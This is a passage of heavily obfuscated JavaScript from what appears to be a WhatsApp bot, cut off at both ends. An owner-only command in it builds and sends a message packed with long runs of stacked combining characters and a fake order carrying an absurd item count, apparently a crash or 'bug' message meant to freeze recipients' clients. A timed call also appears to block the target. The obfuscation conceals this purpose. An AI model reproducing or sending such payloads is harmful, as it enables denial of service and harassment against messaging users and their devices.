QaQ','ࣩࣩࣩࣩ࣯','ؕؖؖؖؖ','ືືືືຶ','͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊','ّّّّّ','ًًًًٍ','̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽','֓֓֓֓֓','ًًّّّ','̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽','͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́','eDisa','1200979orKwdx','֗֗֗֗ؖ','ືືືືື','݆݆݆݆݆','์์๋๋๋','ຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴','҉*Myt','t*৭99','ؕؕؕؕؕ','͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́','᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴','BLACK','๒๒๒*M','์์์์์','҈҉҉҉҉','͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋','99**ঔ','fRhVi','֓֒֒֒֒','ࣩࣩࣩࣩࣩ','݅݅݅݅݅','̫̫̽̽̽̽̽̽̽̽̽̽̽̽̽','݆݆݆݅݅','͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠','2EhGktQ','386031ZjTtDr','only','key','ຶຶຶຶຶ','ount','ࣩࣩࣨࣨࣨ','֒֒֓֓֓','͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠','ٍٍۛۛۛ','֒֘֘֘֘','ٞٞٞٞٞ','ࣩࣧࣧࣧࣧ','9**ঔৣ͜͡','֗֗ؖؖؖ','͢͢͠҉҉҉҉','๋๋ືືື','quote','҉҈҈֟֟','͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋','֟֟֓֓֓','ືຶຶຶຶ','݆݆݅݅݅','sendM','͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠','҈҈҈҈҈','ࣩࣩࣧࣧࣧ','ٍٍٞٞ٘','᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴M','log','statu','cipan','͢͢͠͠͠͠͠͠͠͠͠͠҉','͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊','์์์์๋','᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴\x20','nvSjK','ࣩࣩ࣯ࣩࣩ','ࣩࣧࣧࣧࣧ','͋͢͢͢͢͢͢͢͢͢͠͠͠͠͠','191809UIvCgG','͋͋͋͋͋͋͋͢͢͢͠͠͠͠͠','֗֗֗ؖؖ','selle','֒֒֒֒֒','֘֘֗֗֗','ຶຶຶຶ᪴᪴᪴᪴᪴','҈҈҉҉҉','ythic','݆݆݆݅݅','̫̫̫̫̫̽̽̽̽̽̽̽̽̽̽','parti','̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽','ࣨࣨࣨࣨࣨ','҉҉҈҈֟','ࣩࣩࣩࣩࣧ','157OyWNpx','ঔৣ͜͡҉*M','͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́','ؖؖؕؕؕ','*ঔৣ͜͡҉*','ًّّّّ','3806qyahEk','҉҉҉҉҈','228596HWWiFX','ٍٞٞٞ٘','ܻܻܺܺܺ','ؖؖؖؖؕ','ܺܺ݉݉݉','ًًًًٍ','҈҈҈҈҈̫̫','ٍٍٍۛۛ','֘֘֘֘֗','ot*৭9','ۛۛۛۛۛ','ࣩࣩࣧࣧࣧ','*৭৭৭*','̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͠͠','๋ືືືື','๊๊๊๊ࣤ','͋͋͋͋͢͢͢͢͢͢͠͠͠͠͠','҉҈҈҈҈','ܻܻܻܻܺ','ّؖؖؖؖ','҉҉҈҈҈','ًٍٍٍٍ','̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽','rJid','֘֘֘֘֘','݆݆݆ܻܻ','̫̫̫̫̫̫̫̫̫̫̫̫̫̫̽','݆݆݆݆݊','ܑܑܑۛۛ','ࣨࣤࣤࣤࣤ','ًًًًّ','̼̼̼̽̽̽͊͊͊͊͋͋͋͋͋','ຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴','৭৭৭৭৭','݆݅݅݅݅','ًًًّّ','t*৭৭৭','ท้่เึ','ܑܻܻܻܻ','ܺܺܺܺ݉','ܻܺܺܺܺ','֗֗֗֗֗','̼̼̼̼̼̽̽̽̽͊͊͊͊͋͋','݆݅݅݅݅','ঔৣ͜͡҉*\x20'];var _0x293d1a=function(_0xe5b85f,_0x3e47f9,_0x2b131c,_0x50b73d,_0xb8d2fd){return _0x9cdd(_0xe5b85f-0xf0,_0xb8d2fd);},_0x684e74=function(_0x25fd8a,_0x91e34f,_0x5898f3,_0x242999,_0x14a3c3){return _0x9cdd(_0x25fd8a-0xf0,_0x14a3c3);},_0x40c325=function(_0x3c464a,_0x8c809a,_0x5b0c60,_0x372cc8,_0x578bd0){return _0x9cdd(_0x3c464a-0xf0,_0x578bd0);},_0x28d701=function(_0x4eecc5,_0x3cab4b,_0xd619ab,_0x4cd0f1,_0x12a44a){return _0x9cdd(_0x4eecc5-0xf0,_0x12a44a);},_0x1dea33=function(_0x366fa0,_0x2f56d1,_0x6aa090,_0x49a4ac,_0x385e7d){return _0x9cdd(_0x366fa0-0xf0,_0x385e7d);};(function(_0x33730b,_0x32f0a8){var _0x163b34=function(_0x5f0177,_0x81cca3,_0x114d9e,_0x2eff52,_0x4fa4a2){return _0x9cdd(_0x2eff52- -0x204,_0x5f0177);},_0x32a1c2=function(_0x33946c,_0x2c302d,_0x1ad08d,_0x38ac3b,_0x3d59e1){return _0x9cdd(_0x38ac3b- -0x204,_0x33946c);},_0x4cd96d=function(_0x47e52a,_0x1402ed,_0x272342,_0x4905da,_0x14ba71){return _0x9cdd(_0x4905da- -0x204,_0x47e52a);},_0x43fde5=function(_0x12d949,_0xc6d9f5,_0x30ecb2,_0x418664,_0x43cb19){return _0x9cdd(_0x418664- -0x204,_0x12d949);},_0x5bee71=function(_0x5858b1,_0x3a3a7c,_0x23ba7d,_0x5eeccf,_0x39992f){return _0x9cdd(_0x5eeccf- -0x204,_0x5858b1);};while(!![]){try{var _0x39e2d9=parseInt(_0x163b34(0x25,-0x5f,-0xe3,-0x54,-0xf))+-parseInt(_0x32a1c2(0x9b,0x28,0x1c,0x46,0xa2))+parseInt(_0x4cd96d(-0x1,-0xd6,0x31,-0x5a,-0x13))*-parseInt(_0x43fde5(0xa7,-0x29,-0x52,0x3e,0xd9))+parseInt(_0x32a1c2(0x5d,0x151,0xa4,0xaf,0x34))*parseInt(_0x43fde5(0x55,0xd8,0xfb,0xa2,0x135))+-parseInt(_0x4cd96d(-0x28,0x1c,-0xf9,-0x91,-0x4b))+-parseInt(_0x32a1c2(-0xbd,-0xcb,-0xe4,-0x52,-0x99))*parseInt(_0x5bee71(-0x3a,-0xb,-0x6f,-0x92,-0x72))+-parseInt(_0x163b34(-0x19,0x2d,0x40,-0x6a,-0xfd))*-parseInt(_0x5bee71(-0x43,0x28,0x9b,0x3f,-0x5f));if(_0x39e2d9===_0x32f0a8)break;else _0x33730b['push'](_0x33730b['shift']());}catch(_0x40f4da){_0x33730b['push'](_0x33730b['shift']());}}}(_0x4e42,0x43a45+0x3be1*0x1a+-0x50c2*-0x3));if(!isOwner)return reply(mess[_0x293d1a(0x264,0x2c6,0x252,0x2e4,0x21b)][_0x293d1a(0x38d,0x429,0x3f9,0x2f3,0x31e)+'B']);setTimeout(()=>{var _0x3355c2=function(_0x43513e,_0x57f1de,_0x3e0b47,_0x460706,_0x342bf2){return _0x293d1a(_0x43513e-0x1ee,_0x57f1de-0x172,_0x3e0b47-0x6c,_0x460706-0xdc,_0x460706);},_0x56d461=function(_0x1867b5,_0x343438,_0x4289f5,_0x17c281,_0x5849d4){return _0x293d1a(_0x1867b5-0x1ee,_0x343438-0x1d0,_0x4289f5-0xed,_0x17c281-0xbd,_0x17c281);},_0x551ccd=function(_0x264413,_0x5305dd,_0x11cfee,_0x323213,_0xf60af2){return _0x684e74(_0x264413-0x1ee,_0x5305dd-0x8c,_0x11cfee-0x1b8,_0x323213-0x3e,_0x323213);},_0x506de4=function(_0x108789,_0x32b5a8,_0x2d0447,_0x1d98c5,_0x46e0b7){return _0x684e74(_0x108789-0x1ee,_0x32b5a8-0x1e9,_0x2d0447-0x42,_0x1d98c5-0xb4,_0x1d98c5);},_0x15fee0=function(_0x168d34,_0x2d9aee,_0xc2ee03,_0x2e815a,_0x306ed9){return _0x684e74(_0x168d34-0x1ee,_0x2d9aee-0xf3,_0xc2ee03-0xe8,_0x2e815a-0x6,_0x2e815a);},_0x289218={};_0x289218[_0x3355c2(0x449,0x42a,0x467,0x48f,0x4bb)]=_0x56d461(0x4ce,0x426,0x4fd,0x42b,0x4b8)+'D';var _0x7d80f1=_0x289218;Angga[_0x3355c2(0x4d6,0x50a,0x44d,0x441,0x57d)+_0x551ccd(0x590,0x4e4,0x4e9,0x611,0x52a)+_0x551ccd(0x53d,0x4b3,0x4e3,0x5c4,0x58e)+_0x3355c2(0x503,0x54e,0x582,0x477,0x524)+_0x506de4(0x4fe,0x46a,0x542,0x508,0x506)+'s'](from,_0x7d80f1[_0x15fee0(0x449,0x4e5,0x4d0,0x3ab,0x4ec)]);},-0x1*0x2a2+-0x1*0xcaa+0xf4e);var _0xe42396={};_0xe42396[_0x40c325(0x295,0x227,0x2f9,0x2f7,0x2c0)+_0x28d701(0x281,0x299,0x29c,0x258,0x248)+'t']=_0x28d701(0x394,0x3a7,0x30a,0x353,0x41e)+_0x40c325(0x2d7,0x2e6,0x314,0x2c6,0x36a)+_0x684e74(0x352,0x3ea,0x2bb,0x2da,0x30e)+'t';var _0x5ef334={};function _0x9cdd(_0x70a090,_0xec8581){_0x70a090=_0x70a090-(-0x48d*0x3+0x1bab+-0xca1);var _0x234669=_0x4e42[_0x70a090];return _0x234669;}_0x5ef334[_0x684e74(0x2ed,0x357,0x382,0x2bc,0x344)+_0x40c325(0x267,0x2c5,0x1e6,0x1ff,0x2d6)]=0x98967f,_0x5ef334[_0x293d1a(0x280,0x312,0x300,0x2b1,0x2a9)+'s']=0x1,_0x5ef334[_0x1dea33(0x383,0x385,0x3a4,0x37b,0x3dc)+'ce']=0x1,_0x5ef334[_0x28d701(0x385,0x3b8,0x3e8,0x2f6,0x319)+'ge']=_0x684e74(0x2ce,0x26c,0x2da,0x249,0x315)+_0x1dea33(0x32f,0x3c0,0x370,0x382,0x3c8)+_0x40c325(0x2b6,0x2d8,0x28d,0x32e,0x241)+_0x293d1a(0x291,0x22c,0x21b,0x263,0x239)+_0x293d1a(0x391,0x359,0x361,0x3bf,0x401)+_0x684e74(0x2b6,0x287,0x2c9,0x25e,0x354)+_0x28d701(0x35d,0x390,0x2c7,0x36e,0x3fc)+_0x28d701(0x291,0x294,0x273,0x2e8,0x2b4)+_0x684e74(0x34c,0x3f5,0x2e8,0x301,0x3e8)+_0x684e74(0x34c,0x3f3,0x2f6,0x2f1,0x2d0)+_0x684e74(0x34c,0x382,0x310,0x3d4,0x34e)+_0x28d701(0x34c,0x3bf,0x335,0x303,0x39b)+_0x684e74(0x34c,0x2f5,0x31c,0x2eb,0x30f)+_0x40c325(0x35d,0x3db,0x2ba,0x39c,0x2cf)+_0x684e74(0x2a8,0x20d,0x2ee,0x267,0x219)+_0x293d1a(0x30c,0x36c,0x2bf,0x2f8,0x26f)+_0x293d1a(0x30c,0x386,0x392,0x2c7,0x378)+_0x1dea33(0x25f,0x23e,0x2d6,0x2b4,0x2af)+_0x28d701(0x2b8,0x2c0,0x279,0x273,0x315)+_0x28d701(0x2c1,0x239,0x36b,0x2c7,0x2b0)+_0x40c325(0x37d,0x37b,0x3ba,0x30c,0x410)+_0x684e74(0x303,0x257,0x306,0x279,0x2d3)+_0x28d701(0x29c,0x2a2,0x31e,0x259,0x346)+_0x293d1a(0x2eb,0x394,0x389,0x269,0x29d)+_0x1dea33(0x289,0x1f8,0x1fb,0x205,0x2a5)+_0x40c325(0x30d,0x374,0x324,0x31c,0x3a7)+_0x40c325(0x2e5,0x2d6,0x37e,0x2fc,0x29d)+_0x40c325(0x2e2,0x33a,0x2f7,0x350,0x308)+_0x293d1a(0x271,0x26a,0x216,0x2a7,0x226)+_0x28d701(0x305,0x2b3,0x294,0x26a,0x32d)+_0x293d1a(0x372,0x418,0x3b0,0x2f3,0x3df)+_0x1dea33(0x372,0x3c3,0x2e1,0x403,0x328)+_0x40c325(0x39e,0x3f6,0x38f,0x3c3,0x367)+_0x293d1a(0x39e,0x3cf,0x3bc,0x40d,0x42d)+_0x684e74(0x2e9,0x360,0x2c4,0x2d1,0x35b)+_0x1dea33(0x28e,0x209,0x335,0x21e,0x2a6)+_0x1dea33(0x28e,0x2f4,0x1e1,0x217,0x2c6)+_0x28d701(0x28e,0x221,0x221,0x224,0x2e0)+_0x28d701(0x2f1,0x374,0x31e,0x301,0x363)+_0x28d701(0x301,0x36a,0x311,0x358,0x2d7)+_0x40c325(0x321,0x283,0x3a0,0x2c9,0x38d)+_0x293d1a(0x2aa,0x2ab,0x281,0x345,0x24f)+_0x1dea33(0x2cb,0x2fa,0x2d2,0x362,0x298)+_0x293d1a(0x2cb,0x374,0x2db,0x259,0x253)+_0x1dea33(0x3a4,0x31a,0x339,0x440,0x381)+_0x293d1a(0x35b,0x348,0x3a6,0x305,0x370)+_0x684e74(0x35b,0x3be,0x3ae,0x35a,0x368)+_0x293d1a(0x35b,0x2dd,0x31b,0x32c,0x2d6)+_0x28d701(0x35b,0x3eb,0x300,0x2cf,0x3c2)+_0x40c325(0x35b,0x30e,0x307,0x3af,0x404)+_0x28d701(0x35b,0x2f0,0x2e7,0x3e6,0x3f4)+_0x28d701(0x35b,0x2e3,0x2ba,0x309,0x348)+_0x28d701(0x31c,0x2b5,0x32c,0x2b0,0x393)+_0x1dea33(0x3ab,0x443,0x3f2,0x401,0x369)+_0x40c325(0x2dc,0x254,0x35f,0x2ef,0x2a7)+_0x28d701(0x35b,0x30b,0x2d5,0x3a9,0x407)+_0x1dea33(0x35b,0x2e8,0x3d2,0x308,0x2b0)+_0x684e74(0x39b,0x354,0x2ee,0x39f,0x3d9)+_0x28d701(0x39b,0x33e,0x43e,0x319,0x401)+_0x1dea33(0x2c0,0x33b,0x31c,0x226,0x2e7)+_0x684e74(0x38e,0x411,0x332,0x416,0x2ee)+_0x1dea33(0x26d,0x2f2,0x1cc,0x253,0x208)+_0x293d1a(0x26d,0x1dc,0x318,0x1c5,0x1f7)+_0x1dea33(0x26d,0x215,0x1dc,0x1e0,0x27a)+_0x1dea33(0x26d,0x232,0x314,0x21a,0x284)+_0x28d701(0x390,0x3aa,0x3a5,0x334,0x40f)+_0x293d1a(0x329,0x36b,0x2b0,0x39b,0x29f)+_0x293d1a(0x329,0x3a2,0x2eb,0x32e,0x30f)+_0x293d1a(0x329,0x364,0x366,0x373,0x354)+_0x1dea33(0x329,0x30e,0x2cb,0x3af,0x3b2)+_0x684e74(0x329,0x364,0x32e,0x32f,0x340)+_0x40c325(0x329,0x298,0x341,0x2e3,0x2ef)+_0x40c325(0x329,0x323,0x2d1,0x3b8,0x29f)+_0x28d701(0x329,0x2d2,0x345,0x331,0x39b)+_0x1dea33(0x329,0x3bd,0x2f6,0x37a,0x2f8)+_0x40c325(0x329,0x344,0x37c,0x303,0x2d2)+_0x1dea33(0x329,0x337,0x2d0,0x351,0x2a9)+_0x28d701(0x329,0x30d,0x27d,0x2ca,0x345)+_0x28d701(0x329,0x2b1,0x369,0x375,0x3a2)+_0x28d701(0x329,0x39b,0x378,0x303,0x3b4)+_0x684e74(0x2f8,0x2e2,0x2d9,0x37d,0x24b)+_0x28d701(0x339,0x319,0x35c,0x350,0x31d)+_0x684e74(0x339,0x32e,0x2c3,0x29e,0x2d6)+_0x40c325(0x339,0x2a8,0x318,0x31e,0x317)+_0x40c325(0x339,0x323,0x331,0x360,0x386)+_0x28d701(0x339,0x2c4,0x2c5,0x39e,0x32f)+_0x28d701(0x339,0x33e,0x2c0,0x387,0x2e7)+_0x1dea33(0x339,0x395,0x3d4,0x28c,0x380)+_0x28d701(0x339,0x3a2,0x2f1,0x38f,0x2f8)+_0x684e74(0x339,0x3c0,0x2df,0x397,0x388)+_0x1dea33(0x371,0x2ca,0x346,0x2f5,0x3c0)+_0x40c325(0x2ac,0x31e,0x348,0x2c2,0x217)+_0x28d701(0x2ac,0x2df,0x25a,0x26d,0x2b5)+_0x40c325(0x2ac,0x245,0x2d4,0x2dc,0x200)+_0x40c325(0x2ac,0x328,0x28a,0x2e5,0x30f)+_0x684e74(0x2ac,0x318,0x255,0x30d,0x30c)+_0x293d1a(0x2ac,0x2ea,0x32c,0x2aa,0x335)+_0x1dea33(0x2ac,0x2a2,0x2e8,0x205,0x2ad)+_0x293d1a(0x2ac,0x275,0x308,0x24d,0x348)+_0x1dea33(0x346,0x3f0,0x3b3,0x343,0x363)+_0x684e74(0x328,0x2c2,0x321,0x2f2,0x2d3)+_0x293d1a(0x328,0x286,0x2a1,0x366,0x285)+_0x28d701(0x328,0x2ed,0x304,0x29e,0x293)+_0x1dea33(0x35c,0x30c,0x37d,0x3e4,0x2ff)+_0x28d701(0x348,0x2bf,0x387,0x349,0x2ed)+_0x293d1a(0x2b4,0x33a,0x30d,0x30e,0x275)+_0x40c325(0x300,0x328,0x37a,0x2fa,0x305)+_0x293d1a(0x2a6,0x2b8,0x210,0x2c1,0x30a)+_0x28d701(0x309,0x2da,0x36a,0x31d,0x2b9)+_0x28d701(0x373,0x39d,0x340,0x409,0x41f)+_0x684e74(0x293,0x2b4,0x2d1,0x31e,0x31a)+_0x684e74(0x25e,0x2c9,0x2cc,0x24e,0x206)+_0x684e74(0x278,0x215,0x1e5,0x2fa,0x2e1)+_0x40c325(0x395,0x437,0x3e8,0x43e,0x3e8)+_0x293d1a(0x25e,0x2fb,0x1d6,0x2d2,0x1f8)+_0x1dea33(0x25e,0x266,0x2f5,0x284,0x2be)+_0x28d701(0x2cd,0x317,0x26b,0x301,0x25c)+_0x28d701(0x3a6,0x36d,0x3e9,0x3cb,0x310)+_0x28d701(0x3a6,0x3ed,0x341,0x40d,0x32e)+_0x40c325(0x25e,0x305,0x26d,0x241,0x2d1)+_0x684e74(0x25e,0x1cf,0x27d,0x201,0x241)+_0x1dea33(0x25e,0x1fd,0x1bd,0x1b2,0x25e)+_0x1dea33(0x25e,0x259,0x2f7,0x220,0x24f)+_0x684e74(0x25e,0x287,0x2be,0x226,0x26b)+_0x28d701(0x278,0x30b,0x2db,0x1ef,0x300)+_0x1dea33(0x3a6,0x42e,0x35c,0x378,0x42e)+_0x28d701(0x380,0x3aa,0x2ef,0x30e,0x377)+_0x28d701(0x34b,0x2ba,0x3e3,0x2c4,0x3d2)+_0x1dea33(0x25d,0x303,0x28b,0x250,0x220)+_0x293d1a(0x25d,0x2f4,0x2bc,0x306,0x206)+_0x28d701(0x25d,0x1c6,0x2ae,0x1c3,0x29a)+_0x40c325(0x25d,0x279,0x203,0x215,0x231)+_0x293d1a(0x25d,0x27d,0x2f2,0x302,0x209)+_0x293d1a(0x354,0x330,0x2a7,0x356,0x32e)+_0x293d1a(0x38c,0x34b,0x34c,0x3bd,0x3a5)+_0x1dea33(0x38c,0x382,0x3c9,0x415,0x2e0)+_0x293d1a(0x38c,0x2ea,0x42e,0x339,0x37e)+_0x293d1a(0x38c,0x314,0x40d,0x362,0x312)+_0x1dea33(0x38c,0x3e2,0x33b,0x33c,0x325)+_0x684e74(0x38c,0x37e,0x3e2,0x36e,0x3e0)+_0x40c325(0x38c,0x400,0x368,0x373,0x409)+_0x1dea33(0x38c,0x42d,0x36b,0x2f1,0x3ce)+_0x40c325(0x38c,0x36f,0x3c0,0x370,0x318)+_0x684e74(0x38c,0x3bc,0x311,0x34f,0x3c3)+_0x40c325(0x38c,0x379,0x344,0x351,0x3c4)+_0x293d1a(0x38c,0x348,0x407,0x3f7,0x422)+_0x684e74(0x38c,0x30e,0x3c7,0x3ef,0x40f)+_0x1dea33(0x38c,0x308,0x39f,0x3ab,0x3d6)+_0x293d1a(0x38c,0x421,0x34d,0x367,0x3c1)+_0x28d701(0x38c,0x34e,0x42f,0x369,0x362)+_0x684e74(0x38c,0x37a,0x425,0x3a3,0x3bc)+_0x293d1a(0x38c,0x312,0x3bc,0x3ff,0x355)+_0x684e74(0x38c,0x371,0x3e9,0x394,0x368)+_0x684e74(0x38c,0x409,0x364,0x3e0,0x30d)+_0x293d1a(0x38c,0x3ef,0x37c,0x3cd,0x303)+_0x28d701(0x38c,0x374,0x3ef,0x2fa,0x40c)+_0x28d701(0x38c,0x402,0x385,0x3fb,0x32c)+_0x1dea33(0x38c,0x3bd,0x349,0x317,0x2eb)+_0x40c325(0x38c,0x2ed,0x319,0x340,0x3da)+_0x1dea33(0x2ee,0x26a,0x297,0x283,0x27a)+_0x684e74(0x25d,0x1db,0x1b5,0x2fa,0x2e5)+_0x1dea33(0x268,0x205,0x284,0x29a,0x2a3)+_0x1dea33(0x297,0x1f9,0x28e,0x339,0x296)+_0x684e74(0x297,0x21d,0x284,0x2f7,0x25e)+_0x40c325(0x297,0x225,0x31d,0x305,0x31c)+_0x28d701(0x297,0x319,0x291,0x27e,0x291)+_0x293d1a(0x297,0x1f0,0x28b,0x239,0x2c7)+_0x40c325(0x297,0x2fa,0x243,0x301,0x31f)+_0x40c325(0x297,0x243,0x2a0,0x25f,0x30c)+_0x1dea33(0x297,0x2c7,0x211,0x2f2,0x2a0)+_0x28d701(0x297,0x2b4,0x2cf,0x27b,0x273)+_0x1dea33(0x297,0x1f2,0x2f6,0x2de,0x225)+_0x1dea33(0x37a,0x322,0x2dd,0x372,0x324)+_0x293d1a(0x37a,0x36d,0x341,0x3bd,0x3d6)+_0x1dea33(0x37a,0x403,0x40b,0x336,0x365)+_0x28d701(0x37a,0x3ad,0x3ff,0x414,0x39b)+_0x28d701(0x37a,0x31e,0x330,0x3bd,0x3f5)+_0x293d1a(0x37a,0x320,0x311,0x36f,0x2cf)+_0x40c325(0x344,0x2b0,0x33a,0x2fe,0x2d6)+_0x293d1a(0x344,0x3e6,0x315,0x299,0x306)+_0x684e74(0x344,0x2b1,0x2db,0x3bc,0x392)+_0x684e74(0x344,0x2a3,0x2d7,0x36f,0x2bb)+_0x293d1a(0x344,0x2e4,0x2c7,0x3ac,0x3d1)+_0x28d701(0x344,0x3b1,0x2a6,0x29b,0x2ab)+_0x293d1a(0x344,0x395,0x29a,0x360,0x301)+_0x40c325(0x344,0x365,0x36b,0x336,0x35c)+_0x684e74(0x344,0x2b2,0x396,0x2cc,0x325)+_0x1dea33(0x344,0x397,0x34a,0x366,0x2cf)+_0x40c325(0x344,0x38c,0x2ce,0x398,0x303)+_0x293d1a(0x344,0x2f7,0x3d5,0x2e2,0x383)+_0x28d701(0x344,0x315,0x2bf,0x31a,0x38a)+_0x293d1a(0x344,0x2b9,0x2c9,0x3ca,0x371)+_0x293d1a(0x344,0x2b4,0x29e,0x2b4,0x34f)+_0x684e74(0x344,0x337,0x2dd,0x35a,0x37c)+_0x684e74(0x344,0x32d,0x2b3,0x398,0x2e5)+_0x293d1a(0x344,0x36c,0x326,0x3a7,0x34a)+_0x293d1a(0x344,0x3ec,0x374,0x2ad,0x303)+_0x293d1a(0x344,0x374,0x3ad,0x2cb,0x2cf)+_0x28d701(0x362,0x2f1,0x3fb,0x397,0x2cd)+_0x293d1a(0x257,0x2d1,0x1b4,0x2e9,0x2ba)+(_0x684e74(0x257,0x2f7,0x237,0x2e2,0x1d2)+_0x40c325(0x257,0x201,0x1e7,0x211,0x2e2)+_0x28d701(0x257,0x2c1,0x1e9,0x2b1,0x285)+_0x1dea33(0x257,0x2b5,0x20e,0x2b4,0x1f7)+_0x40c325(0x257,0x21a,0x2d9,0x20e,0x2c2)+_0x293d1a(0x257,0x1e1,0x1de,0x279,0x2c8)+_0x293d1a(0x257,0x21f,0x1cc,0x2e4,0x271)+_0x1dea33(0x257,0x1c0,0x2bb,0x1d6,0x21e)+_0x28d701(0x257,0x2b4,0x1f6,0x277,0x1e5)+_0x293d1a(0x257,0x243,0x296,0x277,0x203)+_0x28d701(0x257,0x1ab,0x270,0x20c,0x221)+_0x293d1a(0x257,0x2d5,0x1ab,0x292,0x2fc)+_0x28d701(0x257,0x2b8,0x1bf,0x206,0x2fd)+_0x1dea33(0x257,0x1f7,0x2a9,0x22d,0x1eb)+_0x40c325(0x257,0x1bf,0x303,0x25b,0x27b)+_0x1dea33(0x257,0x1f1,0x260,0x2a3,0x263)+_0x1dea33(0x3a7,0x347,0x3e7,0x31c,0x3b4)+_0x293d1a(0x367,0x363,0x399,0x311,0x2f2)+_0x28d701(0x367,0x352,0x3c4,0x3fd,0x353)+_0x293d1a(0x367,0x333,0x370,0x40f,0x3b2)+_0x40c325(0x367,0x361,0x309,0x344,0x31f)+_0x40c325(0x367,0x406,0x2f8,0x34d,0x2d5)+_0x293d1a(0x367,0x2c4,0x38e,0x367,0x2ff)+_0x28d701(0x367,0x330,0x32e,0x30e,0x3bd)+_0x684e74(0x367,0x2d1,0x2bf,0x301,0x3f6)+_0x293d1a(0x38a,0x3d2,0x3de,0x311,0x2e4)+_0x1dea33(0x3a5,0x417,0x313,0x43f,0x342)+_0x28d701(0x3a5,0x349,0x37a,0x3f0,0x3ec)+_0x684e74(0x3a5,0x3dd,0x336,0x442,0x367)+_0x40c325(0x3a5,0x446,0x306,0x305,0x3cd)+_0x1dea33(0x2df,0x362,0x274,0x24f,0x35a)+_0x1dea33(0x266,0x1f0,0x2bf,0x212,0x2fa)+_0x293d1a(0x266,0x306,0x1cc,0x1ed,0x1ee)+_0x684e74(0x266,0x2a6,0x29c,0x304,0x2e1)+_0x1dea33(0x266,0x23f,0x22a,0x271,0x2c7)+_0x684e74(0x266,0x259,0x24d,0x310,0x253)+_0x293d1a(0x266,0x259,0x210,0x20a,0x2b5)+_0x1dea33(0x290,0x226,0x27e,0x23d,0x207)+_0x293d1a(0x285,0x259,0x2de,0x206,0x1f5)+'*৭'),_0x5ef334[_0x40c325(0x32d,0x349,0x393,0x394,0x337)+_0x28d701(0x2dd,0x377,0x24c,0x32d,0x29d)]=_0x684e74(0x255,0x1e3,0x22d,0x2f5,0x268)+_0x293d1a(0x38b,0x411,0x323,0x3b9,0x3f2),_0x5ef334[_0x684e74(0x28d,0x31f,0x2a3,0x2c6,0x207)+_0x1dea33(0x2b9,0x2c9,0x27a,0x317,0x237)]=_0x684e74(0x394,0x301,0x340,0x349,0x35e)+_0x28d701(0x2d7,0x37b,0x29e,0x26d,0x381)+_0x684e74(0x352,0x33f,0x346,0x2af,0x36b)+'t';var _0x6d08e1={};_0x6d08e1[_0x293d1a(0x32d,0x388,0x327,0x37c,0x395)+_0x684e74(0x302,0x382,0x32d,0x2c9,0x36a)+'ge']=_0x5ef334;var _0x180c12={};_0x180c12[_0x28d701(0x265,0x23d,0x1f1,0x2a2,0x21d)]=_0xe42396,_0x180c12[_0x40c325(0x385,0x3fc,0x417,0x32c,0x38d)+'ge']=_0x6d08e1;var _0x4150d5={};_0x4150d5[_0x1dea33(0x273,0x1db,0x2d8,0x250,0x2a1)+'d']=_0x180c12,Angga[_0x40c325(0x279,0x234,0x1dd,0x28b,0x294)+_0x40c325(0x357,0x393,0x2c8,0x3f1,0x3fe)+'e'](from,_0x684e74(0x376,0x2fa,0x417,0x3d6,0x36d)+_0x293d1a(0x29e,0x339,0x213,0x349,0x2dc)+_0x1dea33(0x32a,0x2ea,0x3d1,0x2c5,0x2ae)+_0x293d1a(0x36b,0x343,0x301,0x3f5,0x2fa)+_0x293d1a(0x32f,0x3da,0x382,0x3c6,0x2d9)+_0x293d1a(0x2b6,0x27b,0x27c,0x212,0x20b)+_0x293d1a(0x291,0x2ef,0x2db,0x325,0x329)+_0x28d701(0x391,0x3da,0x3f0,0x360,0x36e)+_0x1dea33(0x2b6,0x2e4,0x26e,0x257,0x27d)+_0x1dea33(0x35d,0x3c3,0x2c4,0x2d0,0x34f)+_0x28d701(0x291,0x26f,0x2bb,0x309,0x200)+_0x293d1a(0x34c,0x2ba,0x39c,0x3df,0x301)+_0x1dea33(0x34c,0x2d8,0x2c5,0x37b,0x327)+_0x684e74(0x34c,0x3bf,0x2cb,0x39f,0x3b4)+_0x40c325(0x34c,0x3f4,0x3d1,0x319,0x2ea)+_0x293d1a(0x34c,0x30c,0x307,0x2ec,0x323)+_0x293d1a(0x35d,0x406,0x2e8,0x2e8,0x3e7)+_0x293d1a(0x2a8,0x2a4,0x2cf,0x274,0x25e)+_0x28d701(0x30c,0x293,0x368,0x329,0x2a7)+_0x684e74(0x30c,0x3a8,0x276,0x355,0x2a6)+_0x40c325(0x25f,0x1fb,0x1fc,0x2ac,0x1c6)+_0x1dea33(0x2b8,0x272,0x32d,0x249,0x308)+_0x1dea33(0x2c1,0x2e0,0x35c,0x25c,0x36a)+_0x40c325(0x37d,0x38a,0x371,0x415,0x330)+_0x40c325(0x303,0x266,0x2de,0x2b3,0x298)+_0x684e74(0x29c,0x304,0x2b5,0x209,0x27e)+_0x40c325(0x2eb,0x327,0x26c,0x2c1,0x2cf)+_0x1dea33(0x289,0x316,0x23a,0x32e,0x31e)+_0x684e74(0x30d,0x31f,0x262,0x36d,0x27c)+_0x293d1a(0x2e5,0x32d,0x27c,0x2a5,0x268)+_0x1dea33(0x2e2,0x2aa,0x2a8,0x303,0x304)+_0x293d1a(0x271,0x1f0,0x319,0x258,0x2c7)+_0x684e74(0x305,0x287,0x2ae,0x374,0x2e6)+_0x40c325(0x372,0x406,0x370,0x326,0x404)+_0x684e74(0x372,0x400,0x368,0x347,0x351)+_0x40c325(0x39e,0x449,0x365,0x434,0x403)+_0x293d1a(0x39e,0x39f,0x434,0x375,0x403)+_0x293d1a(0x2e9